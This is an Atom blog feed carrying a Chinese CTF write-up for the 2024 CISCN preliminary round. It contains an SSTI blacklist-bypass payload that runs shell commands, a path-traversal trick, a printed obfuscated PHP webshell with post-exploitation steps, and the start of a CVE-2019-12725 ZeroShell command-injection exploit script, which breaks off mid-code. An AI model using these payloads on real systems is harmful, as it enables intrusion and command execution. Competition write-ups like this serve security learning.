<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ya1orin🍭</title>
  
  
  <link href="https://ya1orin.github.io/atom.xml" rel="self"/>
  
  <link href="https://ya1orin.github.io/"/>
  <updated>2024-12-16T01:20:57.621Z</updated>
  <id>https://ya1orin.github.io/</id>
  
  <author>
    <name>Ya1orin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2024 CISCN x 长城杯铁人三项 初赛 WriteUp</title>
    <link href="https://ya1orin.github.io/posts/cbe4da55.html"/>
    <id>https://ya1orin.github.io/posts/cbe4da55.html</id>
    <published>2024-12-16T00:41:11.000Z</published>
    <updated>2024-12-16T01:20:57.621Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>WEB安全</h1><h2 id="Safe-Proxy">Safe_Proxy</h2><p>题目一进去就给了源码,里面是一个简单的 ssti,但是无回显不出网</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, request, render_template_string</span><br><span class="line">import socket</span><br><span class="line">import threading</span><br><span class="line">import html</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line">def <span class="title function_ invoke__">source</span>():</span><br><span class="line">    with <span class="title function_ invoke__">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>+html.<span class="title function_ invoke__">escape</span>(f.<span class="title function_ invoke__">read</span>())+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_ invoke__">template</span>():</span><br><span class="line">    template_code = request.form.<span class="title function_ invoke__">get</span>(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="comment"># 安全过滤</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> black in blacklist:</span><br><span class="line">        <span class="keyword">if</span> black in template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span></span><br><span class="line">    result = <span class="title function_ invoke__">render_template_string</span>(template_code)</span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">if</span> result is not None <span class="keyword">else</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPProxyHandler</span>:</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>, <span class="title">target_host</span>, <span class="title">target_port</span>):</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">target_host</span> = <span class="title">target_host</span></span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">target_port</span> = <span class="title">target_port</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">handle_request</span>(<span class="title">self</span>, <span class="title">client_socket</span>):</span></span><br><span class="line"><span class="class">        <span class="title">try</span>:</span></span><br><span class="line"><span class="class">            <span class="title">request_data</span> = <span class="title">b</span>&quot;&quot;</span></span><br><span class="line"><span class="class">            <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="class">                <span class="title">chunk</span> = <span class="title">client_socket</span>.<span class="title">recv</span>(4096)</span></span><br><span class="line"><span class="class">                <span class="title">request_data</span> += <span class="title">chunk</span></span></span><br><span class="line"><span class="class">                <span class="title">if</span> <span class="title">len</span>(<span class="title">chunk</span>) &lt; 4096:</span></span><br><span class="line"><span class="class">                    <span class="title">break</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">if</span> <span class="title">not</span> <span class="title">request_data</span>:</span></span><br><span class="line"><span class="class">                <span class="title">client_socket</span>.<span class="title">close</span>()</span></span><br><span class="line"><span class="class">                <span class="title">return</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">with</span> <span class="title">socket</span>.<span class="title">socket</span>(<span class="title">socket</span>.<span class="title">AF_INET</span>, <span class="title">socket</span>.<span class="title">SOCK_STREAM</span>) <span class="title">as</span> <span class="title">proxy_socket</span>:</span></span><br><span class="line"><span class="class">                <span class="title">proxy_socket</span>.<span class="title">connect</span>((<span class="title">self</span>.<span class="title">target_host</span>, <span class="title">self</span>.<span class="title">target_port</span>))</span></span><br><span class="line"><span class="class">                <span class="title">proxy_socket</span>.<span class="title">sendall</span>(<span class="title">request_data</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                <span class="title">response_data</span> = <span class="title">b</span>&quot;&quot;</span></span><br><span class="line"><span class="class">                <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="class">                    <span class="title">chunk</span> = <span class="title">proxy_socket</span>.<span class="title">recv</span>(4096)</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> <span class="title">not</span> <span class="title">chunk</span>:</span></span><br><span class="line"><span class="class">                        <span class="title">break</span></span></span><br><span class="line"><span class="class">                    <span class="title">response_data</span> += <span class="title">chunk</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">header_end</span> = <span class="title">response_data</span>.<span class="title">rfind</span>(<span class="title">b</span>&quot;\<span class="title">r</span>\<span class="title">n</span>\<span class="title">r</span>\<span class="title">n</span>&quot;)</span></span><br><span class="line"><span class="class">            <span class="title">if</span> <span class="title">header_end</span> != -1:</span></span><br><span class="line"><span class="class">                <span class="title">body</span> = <span class="title">response_data</span>[<span class="title">header_end</span> + 4:]</span></span><br><span class="line"><span class="class">            <span class="title">else</span>:</span></span><br><span class="line"><span class="class">                <span class="title">body</span> = <span class="title">response_data</span></span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">            <span class="title">response_body</span> = <span class="title">body</span></span></span><br><span class="line"><span class="class">            <span class="title">response</span> = <span class="title">b</span>&quot;<span class="title">HTTP</span>/1.1 200 <span class="title">OK</span>\<span class="title">r</span>\<span class="title">n</span>&quot; \</span></span><br><span class="line"><span class="class">                       <span class="title">b</span>&quot;<span class="title">Content</span>-<span class="title">Length</span>: &quot; + <span class="title">str</span>(<span class="title">len</span>(<span class="title">response_body</span>)).<span class="title">encode</span>() + <span class="title">b</span>&quot;\<span class="title">r</span>\<span class="title">n</span>&quot; \</span></span><br><span class="line"><span class="class">                       <span class="title">b</span>&quot;<span class="title">Content</span>-<span class="title">Type</span>: <span class="title">text</span>/<span class="title">html</span>; <span class="title">charset</span>=<span class="title">utf</span>-8\<span class="title">r</span>\<span class="title">n</span>&quot; \</span></span><br><span class="line"><span class="class">                       <span class="title">b</span>&quot;\<span class="title">r</span>\<span class="title">n</span>&quot; + <span class="title">response_body</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">client_socket</span>.<span class="title">sendall</span>(<span class="title">response</span>)</span></span><br><span class="line"><span class="class">        <span class="title">except</span> <span class="title">Exception</span> <span class="title">as</span> <span class="title">e</span>:</span></span><br><span class="line"><span class="class">            <span class="title">print</span>(<span class="title">f</span>&quot;<span class="title">Proxy</span> <span class="title">Error</span>: </span>&#123;e&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">        finally:</span></span><br><span class="line"><span class="string">            client_socket.close()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def start_proxy_server(host, port, target_host, target_port):</span></span><br><span class="line"><span class="string">    proxy_handler = HTTPProxyHandler(target_host, target_port)</span></span><br><span class="line"><span class="string">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line"><span class="string">    server_socket.bind((host, port))</span></span><br><span class="line"><span class="string">    server_socket.listen(100)</span></span><br><span class="line"><span class="string">    print(f&quot;</span>Proxy server is running on &#123;host&#125;:&#123;port&#125; <span class="keyword">and</span> forwarding to &#123;target_host&#125;:&#123;target_port&#125;...<span class="string">&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        while True:</span></span><br><span class="line"><span class="string">            client_socket, addr = server_socket.accept()</span></span><br><span class="line"><span class="string">            print(f&quot;</span>Connection <span class="keyword">from</span> &#123;addr&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))</span></span><br><span class="line"><span class="string">            thread.daemon = True</span></span><br><span class="line"><span class="string">            thread.start()</span></span><br><span class="line"><span class="string">    except KeyboardInterrupt:</span></span><br><span class="line"><span class="string">        print(&quot;</span>Shutting down proxy server...<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    finally:</span></span><br><span class="line"><span class="string">        server_socket.close()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def run_flask_app():</span></span><br><span class="line"><span class="string">    app.run(debug=False, host=&#x27;127.0.0.1&#x27;, port=5000)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &quot;</span>__main__<span class="string">&quot;:</span></span><br><span class="line"><span class="string">    proxy_host = &quot;</span><span class="number">0.0</span>.<span class="number">0.0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    proxy_port = 5001</span></span><br><span class="line"><span class="string">    target_host = &quot;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    target_port = 5000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 安全反代，防止针对响应头的攻击</span></span><br><span class="line"><span class="string">    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))</span></span><br><span class="line"><span class="string">    proxy_thread.daemon = True</span></span><br><span class="line"><span class="string">    proxy_thread.start()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    print(&quot;</span>Starting Flask app...<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    run_flask_app()</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>直接本地启服务,设置回显让 fenjing 一把梭得出绕过黑名单的命令</p><p>一开始想复杂了,打算拿内存马打,之后又看到一篇<a href="https://xz.aliyun.com/t/16325?time__1311=GuD%3D0KAKYK7KiKDsD7%2Bd0%3D6RL%3DdGC3IztjeD#toc-2">基于错误页面的回显</a>,但是拿 fenjing 的 payload 梭不好使.打算自己本地手敲一个。</p><p>想尝试写文件的，但是页面还是会报错</p><p>后来又想到之前鹏程杯那道 python 题,也是无回显不出网,当时直接把 flag 写到 <a href="http://app.py">app.py</a> 上,这次也试试看.</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084800322-1614287045.png" alt="image-20241216084748633"></p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>gl%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">2</span>B<span class="string">&#x27;globals&#x27;</span>%<span class="number">2</span>B<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>bu%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">2</span>B<span class="string">&#x27;builtins&#x27;</span>%<span class="number">2</span>B<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>im%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">2</span>B<span class="string">&#x27;i&#x27;</span><span class="string">&#x27;mport&#x27;</span>%<span class="number">2</span>B<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>oe%<span class="number">3</span>D<span class="string">&#x27;so&#x27;</span>%<span class="number">5</span>B%<span class="number">3</span>A%<span class="number">3</span>A-<span class="number">1</span>%<span class="number">5</span>D%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">7</span>Bg.pop%<span class="number">5</span>Bgl%<span class="number">5</span>D%<span class="number">5</span>Bbu%<span class="number">5</span>D%<span class="number">5</span>Bim%<span class="number">5</span>D(oe)%<span class="number">5</span>B<span class="string">&#x27;p&#x27;</span><span class="string">&#x27;open&#x27;</span>%<span class="number">5</span>D(<span class="string">&#x27;cat%20%2Fflag%20%3E%20app.py&#x27;</span>).<span class="title function_ invoke__">read</span>()%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084920779-735291526.png" alt="image-20241216084910073"></p><p>工具链接：<a href="https://github.com/Marven11/FenJing">https://github.com/Marven11/FenJing</a></p><p><code>flag&#123;9cb84d61-9040-47d7-b5ef-4c88ffa6e317&#125;</code></p><h2 id="hello-web">hello_web</h2><p>这题一进去就是一个很可疑,带有文件包含的 url,查看源代码后更是有两个提示</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084927363-2098915863.png" alt="image-20241216084916854"></p><p>肯定是需要文件包含来读取这两个文件.</p><p>经过在 file 参数上的 fuzz,发现他限制长度13 过滤<code>php://</code>, <code>data</code> ,<code>input</code>,这样伪协议几乎是用不了</p><p>在尝试在 file 参数上进行目录穿越的时候发现<code>../</code>不被解析,然后<code>../</code>也没被 ban</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084932527-2092266536.png" alt="image-20241216084921904"></p><p>既然他 ban <code>../</code>的情况下,那么就是将<code>../</code>过滤了,尝试传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//eci-2zecjw6gho6wjsdwij1l.cloudeci1.ichunqiu.com/index.php?file=..././tips.php</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084940869-327419950.png" alt="image-20241216084930190"></p><p>之后访问 hackme.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$lJbGIY</span>=<span class="string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<span class="variable">$OlWYMv</span>=<span class="string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<span class="variable">$lapUCm</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$YwzIst</span>=<span class="variable">$lapUCm</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">30</span>&#125;;<span class="variable">$OxirhK</span>=<span class="variable">$lapUCm</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$YpAUWC</span>=<span class="variable">$OxirhK</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OxirhK</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$OxirhK</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$rVkKjU</span>=<span class="variable">$lapUCm</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">13</span>&#125;;<span class="variable">$YwzIst</span>.=<span class="variable">$lapUCm</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">36</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">30</span>&#125;;<span class="keyword">eval</span>(<span class="variable">$YwzIst</span>(<span class="string">&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>是一个混淆的代码,本地反混淆得到连接密码,直接蚁剑连接</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084950610-1843665184.png" alt="image-20241216084939618"></p><p>由于前面的 tips.php 能看到 disable_function 禁用了许多危险函数,在 LFI 文件夹新建一个马</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085041869-313494412.png" alt="image-20241216085031196"></p><p>再次用蚁剑连接 a.php,并用插件来绕过 disable_fuction 即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085047825-286970171.png" alt="image-20241216085036873"></p><p>连接生成的<code>.antproxy.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085054238-2085140919.png" alt="image-20241216085043576"></p><p>通过 find 找到 flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085059272-25961471.png" alt="image-20241216085048690"></p><p><code>flag&#123;91a89c19-e322-4ceb-8789-0bbc09b033f5&#125;</code></p><h1>威胁检测与网络流量分析</h1><h2 id="zeroshell-1">zeroshell_1</h2><p>直接CTF-NetA扫描，看见Referer。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085136211-1607001841.png" alt="image-20241216085125418"></p><p>直接Cyberchef解码，得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085204370-212498903.png" alt="image-20241216085153708"></p><p><code>flag&#123;6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A&#125;</code></p><h2 id="zeroshell-2">zeroshell_2</h2><p>根据手册搭建环境，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085229026-1094870602.png" alt="image-20241216085218365"></p><p>然后去网上搜zeroshell的exp直接搜到CVE-2019-12725随便找一个exp。我找的这个<a href="https://gryffinbit.top/2022/11/16/ZeroShell-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-CVE-2019-12725/">CVE-2019-12725</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">url_list=[]</span><br><span class="line"></span><br><span class="line"><span class="comment">#随机ua</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ua</span>():</span><br><span class="line">first_num = random.randint(<span class="number">55</span>, <span class="number">62</span>)</span><br><span class="line">third_num = random.randint(<span class="number">0</span>, <span class="number">3200</span>)</span><br><span class="line">fourth_num = random.randint(<span class="number">0</span>, <span class="number">140</span>)</span><br><span class="line">os_type = [</span><br><span class="line"><span class="string">&#x27;(Windows NT 6.1; WOW64)&#x27;</span>, <span class="string">&#x27;(Windows NT 10.0; WOW64)&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;(Macintosh; Intel Mac OS X 10_12_6)&#x27;</span></span><br><span class="line">]</span><br><span class="line">chrome_version = <span class="string">&#x27;Chrome/&#123;&#125;.0.&#123;&#125;.&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(first_num, third_num, fourth_num)</span><br><span class="line"></span><br><span class="line">ua = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;Mozilla/5.0&#x27;</span>, random.choice(os_type), <span class="string">&#x27;AppleWebKit/537.36&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;(KHTML, like Gecko)&#x27;</span>, chrome_version, <span class="string">&#x27;Safari/537.36&#x27;</span>]</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">return</span> ua</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_vuln</span>(<span class="params">url</span>):</span><br><span class="line">url = parse.urlparse(url)</span><br><span class="line">url2=url.scheme + <span class="string">&#x27;://&#x27;</span> + url.netloc </span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: get_ua(),</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># data=base64.b64encode(&quot;eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=&quot;)</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res2 = requests.get(url2 + <span class="string">&#x27;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Aid%0A%27&#x27;</span>,headers=headers,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res2.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;uid&quot;</span> <span class="keyword">in</span> res2.text:</span><br><span class="line"><span 